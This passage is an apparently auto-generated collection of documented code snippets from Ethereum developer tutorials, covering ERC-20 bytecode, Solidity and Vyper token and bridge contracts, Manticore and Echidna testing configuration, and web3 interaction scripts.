KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x55F JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x59A PUSH2 0x593 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5BB DUP5 DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH2 0x67C DUP5 PUSH2 0x5C7 PUSH2 0x9AD JUMP JUMPDEST PUSH2 0x677 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1026 PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 DUP12 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x62D PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x747 PUSH2 0x6AB PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x742 DUP6 PUSH1 0x1 PUSH1 0x0 PUSH2 0x6BC PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x831 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x806 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x831 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x814 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x8FE PUSH2 0x848 PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x8F9 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1097 PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 PUSH2 0x872 PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP11 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x91C PUSH2 0x915 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xA3B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x1073 PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xAC1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFDE PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xC32 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x104E PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xCB8 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFBB PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0xCC3 DUP4 DUP4 DUP4 PUSH2 0xFB5 JUMP JUMPDEST PUSH2 0xD2E DUP2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1000 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x0 DUP1 DUP8 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2\n```\n\n----------------------------------------\n\nTITLE: Adding Waffle Build Script to package.json\nDESCRIPTION: Configuration for package.json to add a build script that uses Waffle to compile Solidity contracts.\n\nLANGUAGE: json\nCODE:\n```\n\"scripts\": {\n    \"build\": \"waffle\"\n  }\n```\n\n----------------------------------------\n\nTITLE: MUD Configuration for Access Control\nDESCRIPTION: The MUD configuration file mud.config.ts defines access control for the ServerSystem, restricting function calls to a single address.\n\nLANGUAGE: TypeScript\nCODE:\n```\n// From mud.config.ts lines 67-72\n// Restricts access to the server functions to a single address\n```\n\n----------------------------------------\n\nTITLE: Creating Symbolic Values and Executing Symbolic Transaction\nDESCRIPTION: Example of creating symbolic values and a symbolic buffer to use in a transaction, allowing Manticore to explore all possible function executions during analysis.\n\nLANGUAGE: python\nCODE:\n```\nsymbolic_value = m.make_symbolic_value()\nsymbolic_data = m.make_symbolic_buffer(320)\nm.transaction(caller=user_account,\n              address=contract_address,\n              data=symbolic_data,\n              value=symbolic_value)\n```\n\n----------------------------------------\n\nTITLE: Echidna Filter Configuration in YAML\nDESCRIPTION: A YAML configuration file that specifies which functions to exclude from Echidna's fuzzing campaign. This example filters out the 'pop' and 'clear' functions to better measure maximum gas consumption.\n\nLANGUAGE: yaml\nCODE:\n```\nfilterBlacklist: true\nfilterFunctions: [\"pop\", \"clear\"]\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token String Handling Logic in EVM Bytecode\nDESCRIPTION: This bytecode section handles string operations for token name and symbol. It contains the operations that load and return string values stored in contract storage, using Solidity's memory handling mechanisms.\n\nLANGUAGE: bytecode\nCODE:\n```\nPUSH1 0x60 PUSH1 0x3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x57C JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x551 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x57C JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x55F JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP\n```\n\n----------------------------------------\n\nTITLE: Installation d'Alchemy Web3 pour interagir avec Ethereum\nDESCRIPTION: Commande npm pour installer la bibliothèque Alchemy Web3, une version améliorée de Web3.js qui facilite les requêtes vers la blockchain Ethereum.\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @alch/alchemy-web3\n```\n\n----------------------------------------\n\nTITLE: Implementing Account Freezing Function in Solidity\nDESCRIPTION: A function that can only be called by the contract owner to freeze a specific account. It checks if the account is already frozen before updating the state.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction freezeAccount(address addr)\n  public\n  onlyOwner\n{\n    require(!frozenAccounts[addr], \"Account already frozen\");\n    frozenAccounts[addr] = true;\n    emit AccountFrozen(addr);\n}  // freezeAccount\n```\n\n----------------------------------------\n\nTITLE: Implementing Core Transfer Function in ERC-721 Contract\nDESCRIPTION: An internal function that executes the transfer of a token between addresses. It validates the transfer authorization, clears approvals, updates ownership records, and emits the Transfer event.\n\nLANGUAGE: vyper\nCODE:\n```\n@internal\ndef _transferFrom(_from: address, _to: address, _tokenId: uint256, _sender: address):\n    \"\"\"\n    @dev Execute transfer of a NFT.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n         address for this NFT. (NOTE: `msg.sender` not allowed in private function so pass `_sender`.)\n         Throws if `_to` is the zero address.\n         Throws if `_from` is not the current owner.\n         Throws if `_tokenId` is not a valid NFT.\n    \"\"\"\n    # Check requirements\n    assert self._isApprovedOrOwner(_sender, _tokenId)\n    # Throws if `_to` is the zero address\n    assert _to != ZERO_ADDRESS\n    # Clear approval. Throws if `_from` is not the current owner\n    self._clearApproval(_from, _tokenId)\n    # Remove NFT. Throws if `_tokenId` is not a valid NFT\n    self._removeTokenFrom(_from, _tokenId)\n    # Add NFT\n    self._addTokenTo(_to, _tokenId)\n    # Log the transfer\n    log Transfer(_from, _to, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: Creating Translation Hub Callout Component in React/JSX\nDESCRIPTION: A callout component that highlights the in-person translation hub locations for the Translatathon event.\n\nLANGUAGE: jsx\nCODE:\n```\n<TranslationHubCallout>\n  <h3 style={{margin:0}}>Translatathon hubs</h3>\n\n  This year we bring IRL community hubs to join local communities and help translate. These hubs are located all over the world, find out if there is one close to you and join the community!\n</TranslationHubCallout>\n```\n\n----------------------------------------\n\nTITLE: Echidna YAML Configuration for Blacklisting Functions\nDESCRIPTION: YAML configuration that blacklists specific functions to prevent Echidna from calling them during testing. This helps to create conditions for finding higher gas consumption scenarios by preventing array-emptying operations.\n\nLANGUAGE: yaml\nCODE:\n```\nfilterBlacklist: true\nfilterFunctions: [\"pop\", \"clear\"]\n```\n\n----------------------------------------\n\nTITLE: Creating an Account from a Private Key\nDESCRIPTION: Converting the private key from environment variables into a Viem account object that can be used for signing transactions.\n\nLANGUAGE: typescript\nCODE:\n```\nconst account = privateKeyToAccount(process.env.PRIVATE_KEY as `0x${string}`)\n```\n\n----------------------------------------\n\nTITLE: Computing Witness for Dig Operation\nDESCRIPTION: Executes the dig program with the provided map and coordinates to compute a witness which will be used to generate a zero-knowledge proof.\n\nLANGUAGE: typescript\nCODE:\n```\nconst runResults = zokrates.computeWitness(digCompiled, [map, `${x}`, `${y}`])\n```\n\n----------------------------------------\n\nTITLE: Günlük Blok Sayısı Hesaplama Formülü\nDESCRIPTION: 12 saniyelik blok süresini baz alarak Ethereum'da günlük oluşturulan toplam blok sayısını hesaplama adımları.\n\nLANGUAGE: markdown\nCODE:\n```\n- `(1 blok/12 saniye) * (60 saniye/dakika) = 5 blok/dakika`\n- `(5 blok/dakika) * (60 dakika/saat) = 300 blok/saat`\n- `(300 blok/saat) * (24 saat/gün) = 7200 blok/gün`\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 Token Transfer and Approval Functions in EVM Bytecode\nDESCRIPTION: This bytecode implements the core functionality of an ERC20 token contract on Ethereum, including transfer operations, allowance management, and balance checking. It contains the low-level EVM operations that handle token movement between addresses and authorization checks.\n\nLANGUAGE: bytecode\nCODE:\n```\n0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x83B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x452 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x41C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x908 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x4CE PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x482 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x926 JUMP\n```\n\n----------------------------------------\n\nTITLE: Creating a Token Transfer Transaction with Compact Calldata\nDESCRIPTION: Example of creating a token transfer transaction using minimal calldata. The data includes a function identifier (0x02), destination address, and amount (0x0100 which equals 256 in decimal).\n\nLANGUAGE: javascript\nCODE:\n```\n// Transfer tokens\nconst destAddr = \"0xf5a6ead936fb47f342bb63e676479bddf26ebe1d\"\nconst transferTx = {\n  to: cdi.address,\n  data: \"0x02\" + destAddr.slice(2, 42) + \"0100\",\n}\n```\n\n----------------------------------------\n\nTITLE: Complete Smart Contract Interaction Script\nDESCRIPTION: Full implementation of the interaction script that reads the initial message, updates it with a new value, and reads the updated message, demonstrating the complete lifecycle of contract interaction.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\nconst API_KEY = process.env.API_KEY\nconst PRIVATE_KEY = process.env.PRIVATE_KEY\nconst CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS\n\nconst contract = require(\"../artifacts/contracts/HelloWorld.sol/HelloWorld.json\")\n\n// provider - Alchemy\nconst alchemyProvider = new ethers.providers.AlchemyProvider(\n  (network = \"goerli\"),\n  API_KEY\n)\n\n// signer - you\nconst signer = new ethers.Wallet(PRIVATE_KEY, alchemyProvider)\n\n// contract instance\nconst helloWorldContract = new ethers.Contract(\n  CONTRACT_ADDRESS,\n  contract.abi,\n  signer\n)\n\nasync function main() {\n  const message = await helloWorldContract.message()\n  console.log(\"The message is: \" + message)\n\n  console.log(\"Updating the message...\")\n  const tx = await helloWorldContract.update(\"this is the new message\")\n  await tx.wait()\n\n  const newMessage = await helloWorldContract.message()\n  console.log(\"The new message is: \" + newMessage)\n}\n\nmain()\n```\n\n----------------------------------------\n\nTITLE: Implementing Constructor for UniswapV2ERC20 in Solidity\nDESCRIPTION: This constructor initializes the ERC-20 token contract with EIP-712 domain separator, used for validating permits. It retrieves the current chain ID using inline assembly and encodes contract details according to EIP-712 standard.\n\nLANGUAGE: solidity\nCODE:\n```\n    constructor() public {\n        uint chainId;\n        assembly {\n            chainId := chainid\n        }\n\n        DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),\n                keccak256(bytes(name)),\n                keccak256(bytes('1')),\n                chainId,\n                address(this)\n            )\n        );\n    }\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies for React NFT Minter Project\nDESCRIPTION: Commands to install the necessary dependencies for the NFT minter React project. This must be run in the root directory of the minter-starter-files folder to install all required packages before starting the development server.\n\nLANGUAGE: bash\nCODE:\n```\ncd minter-starter-files\nnpm install\n```\n\n----------------------------------------\n\nTITLE: Setting Solidity Version Pragma for Optimism Bridge\nDESCRIPTION: Specifies the compatible Solidity compiler versions for the bridge contracts. The code is designed to work with any Solidity version from 0.5.0 up to but not including 0.9.0.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity >0.5.0 <0.9.0;\n```\n\n----------------------------------------\n\nTITLE: Creating .env File for NFT Minting Project\nDESCRIPTION: Command to create a .env file using vim editor where Pinata API credentials will be stored.\n\nLANGUAGE: javascript\nCODE:\n```\nvim.env\n```\n\n----------------------------------------\n\nTITLE: Internal Withdrawal Logic for Optimism L2 Bridge\nDESCRIPTION: Internal function that implements the withdrawal process by burning tokens on L2 and sending a message to L1 to release the equivalent tokens there. Different handling for ETH and ERC20 tokens.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Performs the logic for withdrawals by burning the token and informing\n     *      the L1 token Gateway of the withdrawal.\n     * @param _l2Token Address of L2 token where withdrawal is initiated.\n     * @param _from Account to pull the withdrawal from on L2.\n     * @param _to Account to give the withdrawal to on L1.\n     * @param _amount Amount of the token to withdraw.\n     * @param _l1Gas Unused, but included for potential forward compatibility considerations.\n     * @param _data Optional data to forward to L1. This data is provided\n     *        solely as a convenience for external contracts. Aside from enforcing a maximum\n     *        length, these contracts provide no guarantees about its content.\n     */\n    function _initiateWithdrawal(\n        address _l2Token,\n        address _from,\n        address _to,\n        uint256 _amount,\n        uint32 _l1Gas,\n        bytes calldata _data\n    ) internal {\n        // When a withdrawal is initiated, we burn the withdrawer's funds to prevent subsequent L2\n        // usage\n        // slither-disable-next-line reentrancy-events\n        IL2StandardERC20(_l2Token).burn(msg.sender, _amount);\n\n        // Construct calldata for l1TokenBridge.finalizeERC20Withdrawal(_to, _amount)\n        // slither-disable-next-line reentrancy-events\n        address l1Token = IL2StandardERC20(_l2Token).l1Token();\n        bytes memory message;\n\n        if (_l2Token == Lib_PredeployAddresses.OVM_ETH) {\n            message = abi.encodeWithSelector(\n                IL1StandardBridge.finalizeETHWithdrawal.selector,\n                _from,\n                _to,\n                _amount,\n                _data\n            );\n        } else {\n            message = abi.encodeWithSelector(\n                IL1ERC20Bridge.finalizeERC20Withdrawal.selector,\n                l1Token,\n                _l2Token,\n                _from,\n                _to,\n                _amount,\n                _data\n            );\n        }\n\n        // Send message up to L1 bridge\n        // slither-disable-next-line reentrancy-events\n        sendCrossDomainMessage(l1TokenBridge, _l1Gas, message);\n\n        // slither-disable-next-line reentrancy-events\n        emit WithdrawalInitiated(l1Token, _l2Token, msg.sender, _to, _amount, _data);\n    }\n```\n\n----------------------------------------\n\nTITLE: IL2StandardERC20 Interface Imports\nDESCRIPTION: Imports required for the IL2StandardERC20 interface, including the standard IERC20 interface from OpenZeppelin which defines the basic ERC-20 functionality.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n```\n\n----------------------------------------\n\nTITLE: Converting Assets to Shares in ERC-4626 Vaults in Solidity\nDESCRIPTION: This function returns the amount of shares that would be exchanged by the vault for the given amount of assets.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction convertToShares(uint256 assets) public view returns (uint256 shares)\n```\n\n----------------------------------------\n\nTITLE: Defining ERC20WithdrawalFinalized Event for Optimism L1 Bridge\nDESCRIPTION: Definition of an event that's emitted when an ERC-20 token withdrawal (L2 to L1 transfer) is finalized on L1. The event has the same parameter structure as the deposit event.\n\nLANGUAGE: solidity\nCODE:\n```\n    event ERC20WithdrawalFinalized(\n        address indexed _l1Token,\n        address indexed _l2Token,\n        address indexed _from,\n        address _to,\n        uint256 _amount,\n        bytes _data\n    );\n```\n\n----------------------------------------\n\nTITLE: Implementing Integer Encoding and Decoding for Dagger-Hashimoto in Python\nDESCRIPTION: Functions for marshaling unsigned integers of 512-bit precision to strings using a big-endian scheme and vice versa. These are core utility functions used in the DAG generation process.\n\nLANGUAGE: python\nCODE:\n```\nNUM_BITS = 512\n\ndef encode_int(x):\n    